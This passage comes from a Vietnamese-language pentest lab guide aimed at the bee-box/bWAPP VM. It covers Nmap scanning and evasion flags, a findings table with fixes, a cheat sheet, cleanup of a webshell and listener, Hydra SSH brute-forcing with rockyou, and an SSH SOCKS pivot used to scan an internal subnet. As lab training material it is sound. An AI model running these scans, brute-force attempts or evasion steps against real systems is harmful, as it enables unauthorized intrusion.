| Flag | Ý nghĩa |
|---|---|
| `-f` / `-ff` | Fragment IP (8 byte / 16 byte) |
| `--mtu N` | Tự đặt MTU (bội số 8) |
| `-D RND:10` | 10 decoy ngẫu nhiên |
| `--source-port 53` | Giả port nguồn DNS |
| `--spoof-mac` | Đổi MAC nguồn (LAN) |
| `--data-length N` | Đệm payload |
| `-T2` / `--scan-delay` | Giảm tốc, né rate-limit |
| `--packet-trace` | In từng packet — công cụ học tốt nhất |

> **Lưu ý:** trong lab host-only, evasion gần như không cần thiết; giá trị nằm ở việc **giải thích được cơ chế**. Đừng dùng decoy/spoof ra ngoài phạm vi.

---

## 12. OUTPUT, REPORT & CHECKLIST

### 12.1. Chuẩn hoá output

```bash
# 1 lệnh cho 3 định dạng
sudo nmap -sS -sV -O -p- -T4 -Pn --reason -oA loot/final_full $TARGET

# Chỉ lấy port mở (gọn cho report)
grep -E "^\s*[0-9]+/tcp" loot/final_full.nmap

# Chuyển XML → HTML bằng xsltproc (Kali có sẵn)
xsltproc loot/final_full.xml -o loot/final_full.html
# hoặc
xsltproc /usr/share/nmap/nmap.xsl loot/final_full.xml > loot/final_full.html
```

| Flag | Định dạng |
|---|---|
| `-oN` | Text "bình thường" (giống màn hình) |
| `-oX` | XML (cho tool khác: Metasploit `db_import`, Faraday, xsltproc) |
| `-oG` | Grepable (dễ `grep`/`awk`) |
| `-oA` | Cả 3 |
| `-v` / `-vv` / `-d` | Tăng mức log / debug |
| `--stats-every 30s` | In tiến độ mỗi 30s (scan dài) |
| `--open` | Chỉ hiện port mở |

### 12.2. Bảng finding mẫu (điền theo kết quả thật)

| # | Finding | Mức độ | Bằng chứng (phase) | Khuyến nghị |
|---|---|---|---|---|
| 1 | SSH/MySQL dùng credential mặc định `bee/bug`, `root/bug` | Critical | P7 Hydra | Đổi mật khẩu, tắt root login, key-only |
| 2 | bWAPP có SQLi / OS Command Injection | Critical | P8 | Chỉ dùng lab; production phải dùng prepared statement, validate input |
| 3 | Apache 2.2.14 / PHP cũ (EOL) | High | P3 `-sV` | Nâng cấp, vá CVE |
| 4 | `/server-status`, `/phpmyadmin/` public | High | P5 `http-enum`, Nikto | Hạn chế IP, thêm auth |
| 5 | Thiếu `X-Frame-Options`, `CSP`, cookie không `HttpOnly` | Medium | P5 `http-headers`, `http-cookie-flags` | Thêm security header |
| 6 | TRACE bật, directory listing bật | Medium | P5 `http-methods` | Tắt `TraceEnable`, `Options -Indexes` |
| 7 | SSH thuật toán yếu (CBC, group1-sha1) | Low/Medium | P5 `ssh2-enum-algos` | Cấu hình `Ciphers`/`KexAlgorithms` hiện đại |
| 8 | MySQL mở ra toàn mạng | Medium | P2 `-p-` | Bind `127.0.0.1`, firewall |

### 12.3. Checklist trước khi kết thúc

```
[ ] Đã lưu toàn bộ log vào loot/ (-oA cho mọi phase)
[ ] Mỗi finding có: mô tả + bằng chứng (command + output) + mức độ + fix
[ ] Đã phân biệt rõ "VULNERABLE" vs "LIKELY VULNERABLE"
[ ] Đã chụp ảnh / lưu PoC (SQLi result, shell `id`, Hydra success)
[ ] Đã xoá webshell, tunnel SSH, file upload khỏi bee-box
[ ] Đã revert snapshot CLEAN-BEFORE-PENTEST (hoặc shutdown VM)
[ ] Đã ghi lại thời gian từng phase để đưa vào report timeline
```

### 12.4. Dọn dẹp

```bash
# Kali: kill tunnel / listener
pkill -f "ssh -D 1080"; pkill -f "nc -lvnp"

# bee-box: xoá artefact (nếu không revert snapshot)
rm -f /var/www/bWAPP/shell.php /tmp/*.php
# rồi revert snapshot trong VMware
```

---

## 13. CHEAT SHEET NHANH (dán được ngay)

```bash
# ===== 1. TÌM MÁY =====
sudo nmap -sn 192.168.91.0/24

# ===== 2. BẢN ĐỒ PORT =====
sudo nmap -sS -T4 -Pn --top-ports 1000 $TARGET
sudo nmap -sS -p- -T4 -Pn --min-rate 1000 $TARGET
sudo nmap -sU --top-ports 50 -T4 -Pn $TARGET

# ===== 3. DỊCH VỤ + OS =====
sudo nmap -sV --version-all -O --osscan-guess -p 22,80,443,3306 $TARGET

# ===== 4. NSE =====
sudo nmap -sC -sV -p 22,80,443,3306 $TARGET
sudo nmap -p 80,443 --script "http-enum,http-methods,http-headers,http-title" $TARGET
sudo nmap -p 3306 --script "mysql-info,mysql-empty-password" $TARGET
sudo nmap -p 22 --script "ssh-auth-methods,ssh2-enum-algos" $TARGET
sudo nmap --script vuln -sV $TARGET

# ===== 5. TOOL PHỤ =====
nikto -h http://$TARGET -Tuning 123bde -o nikto.txt
hydra -l bee -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t 4 -f -V

# ===== 6. PIVOT =====
ssh -D 1080 -N -f bee@$TARGET
sudo proxychains4 nmap -sT -Pn -n -p 22,80,443,3306 10.0.0.0/24 --open
```

---

## 14. LỖI THƯỜNG GẶP & CÁCH XỬ LÝ

| Triệu chứng | Nguyên nhân | Cách xử lý |
|---|---|---|
| `-sn` không thấy host nào | Khác subnet / firewall | Kiểm tra VMnet của 2 VM; thử `-Pn`, `-PS` |
| `-sS` báo "requires root" | Chưa sudo | `sudo nmap` hoặc `-sT` |
| Full port scan treo rất lâu | Port bị drop, retry cao | `--max-retries 2 --min-rate 1000 --host-timeout 10m` |
| `-O` báo "no OS matches" | Không đủ port mở/đóng | Thêm `--osscan-guess`; đảm bảo có ≥1 port đóng |
| NSE chậm / treo | Script chờ timeout | `--script-timeout 60s`, chạy từng nhóm |
| Hydra SSH fail liên tục | `MaxStartups`/fail2ban | Giảm `-t 2`, thêm `-W 3` |
| Hydra HTTP form fail 100% | Có CSRF token | Dùng Burp Intruder / script riêng; ghi nhận là control tốt |
| proxychains + `-sS` không chạy | SYN cần raw socket | Dùng `-sT -Pn -n` |
| bee-box không vào mạng | Đang bridged | Đổi Network Adapter sang VMnet1 (host-only) |
| Không login được bWAPP | Chưa set security level | Vào `/bWAPP/`, bấm `here` → chọn `low` |

---

## 15. TIMELINE GỢI Ý

| Thời gian | Hoạt động |
|---|---|
| 0:00 – 0:10 | Setup network VMnet1, snapshot, xác nhận IP |
| 0:10 – 0:20 | P1 Host discovery + P2 top-1000 |
| 0:20 – 0:35 | P2 full-port TCP + UDP |
| 0:35 – 0:50 | P3 Version + P4 OS |
| 0:50 – 1:20 | P5 NSE (default → http → mysql → ssh → ssl) |
| 1:20 – 1:40 | P6 NSE vuln |
| 1:40 – 2:00 | Nikto + Hydra |
| 2:00 – 2:40 | P8 Exploit chain, shell, privesc, pivot |
| 2:40 – 3:00 | Report, dọn dẹp, revert snapshot |

---

## 16. PHỤ LỤC — VÌ SAO CHỌN NMAP LÀM TRUNG TÂM?

| Năng lực | Nmap đảm nhiệm | Tool khác có làm tốt hơn? |
|---|---|---|
| Host discovery | `-sn` + 6 loại probe | `arp-scan` (chỉ LAN), `netdiscover` |
| Port scan đa kỹ thuật | `-sS/-sT/-sU/-sA/-sN/-sF/-sX/-sI` | Masscan (nhanh hơn nhưng ít kỹ thuật) |
| Version detection | `-sV` ~ 12.000 probe | Chỉ Nmap |
| OS fingerprint | `-O` (TCP/IP stack) | Chỉ Nmap |
| Script engine | 600+ NSE script, 14 category | Nikto (chỉ web), sqlmap (chỉ SQLi) |
| Firewall mapping | `-sA`, `--reason` | hping3 |
| Evasion | `-f`, `-D`, `--spoof-mac`, `--source-port` | Chỉ Nmap đủ bộ |
| Output chuẩn hoá | XML/GNMAP/JSON → tool khác | Nmap là chuẩn de-facto |
| Pivot | `-sT` qua proxychains | — |

→ **Kết luận:** Nmap phủ được **80% quy trình** (recon → enumeration → vuln hint). Nikto và Hydra chỉ lấp 2 khoảng trống: *web misconfiguration sâu* và *credential verification*. Phần exploit (SQLi/RCE/privesc) là thao tác thủ công có kiểm soát, không phải "chạy tool".
